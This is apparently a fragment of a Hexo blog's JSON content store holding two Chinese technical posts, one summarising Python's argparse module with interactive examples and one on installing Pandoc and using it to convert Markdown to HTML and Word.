ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\" target=\"_blank\" rel=\"external\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\" target=\"_blank\" rel=\"external\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\" target=\"_blank\" rel=\"external\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version=\"\">‘).</the></li>\n</ol>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>","more":"<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version=\"\">‘).</the></li>\n</ol>"},{"title":"Pandoc | a universal document converter","date":"2017-05-02T02:02:42.000Z","_content":"\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n<!-- more -->\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","source":"_posts/Pandoc-a-universal-document-converter.md","raw":"---\ntitle: Pandoc | a universal document converter\ndate: 2017-05-02 10:02:42\ntags:\n---\n\n近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。\n\n\n官方主页: [http://www.pandoc.org](http://www.pandoc.org)\n\nGet Start: [http://www.pandoc.org/getting-started.html](http://www.pandoc.org/getting-started.html)\n## 安装\n```bash\nbrew install pandoc     # 简单到爆\npandoc --verison        # 查看版本\n```\n<!-- more -->\n## 转换文件\nDemos : [http://www.pandoc.org/demos.html](http://www.pandoc.org/demos.html)\n```bash\npandoc test.md -f markdown -t html -s -o test.html\n# 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.\n\npandoc -s -S MANUAL.txt -o example29.docx\n\npandoc source/_posts/Pandoc-a-universal-document-converter.md -o ~/TempDocs/pandoc.docx\n\n```\n\n![本地图片](../img/dreamcruise.jpg)\n![远程图片](https://images.apple.com/v/home/df/images/promos/airpods_large.jpg)\n\n实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。","slug":"Pandoc-a-universal-document-converter","published":1,"updated":"2017-06-08T13:05:25.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hso0009vquvwytuie0s","content":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\" target=\"_blank\" rel=\"external\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\" target=\"_blank\" rel=\"external\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/05/Pandoc-a-universal-document-converter/img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>\n","site":{"data":{}},"excerpt":"<p>近端时间开始使用Markdown写东西，欲罢不能。我打算在写报告的时候也使用MD，但是写好之后需要导出为其它格式(word/html/pdf等)，找了一堆MD软件，没有中意的。最后，发现这款转换工具，虽然这样用起来显得不智能，但属于开源项目，而且功能应该属于是强到炸天，故而入坑试试。</p>\n<p>官方主页: <a href=\"http://www.pandoc.org\">http://www.pandoc.org</a></p>\n<p>Get Start: <a href=\"http://www.pandoc.org/getting-started.html\">http://www.pandoc.org/getting-started.html</a></p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install pandoc     <span class=\"comment\"># 简单到爆</span></div><div class=\"line\">pandoc --verison        <span class=\"comment\"># 查看版本</span></div></pre></td></tr></table></figure>","more":"<h2 id=\"转换文件\"><a href=\"#转换文件\" class=\"headerlink\" title=\"转换文件\"></a>转换文件</h2><p>Demos : <a href=\"http://www.pandoc.org/demos.html\">http://www.pandoc.org/demos.html</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">pandoc test.md <span class=\"_\">-f</span> markdown -t html <span class=\"_\">-s</span> -o test.html</div><div class=\"line\"><span class=\"comment\"># 将Markdown格式的test.md文件转换成独立的html文件输出到test.html.</span></div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"_\">-s</span> -S MANUAL.txt -o example29.docx</div><div class=\"line\"></div><div class=\"line\">pandoc <span class=\"built_in\">source</span>/_posts/Pandoc<span class=\"_\">-a</span>-universal-document-converter.md -o ~/TempDocs/pandoc.docx</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/05/Pandoc-a-universal-document-converter/img/dreamcruise.jpg\" alt=\"本地图片\"><br><img src=\"https://images.apple.com/v/home/df/images/promos/airpods_large.jpg\" alt=\"远程图片\"></p>\n<p>实测，能进行转换，但貌似排版格式就变得有点难看了。  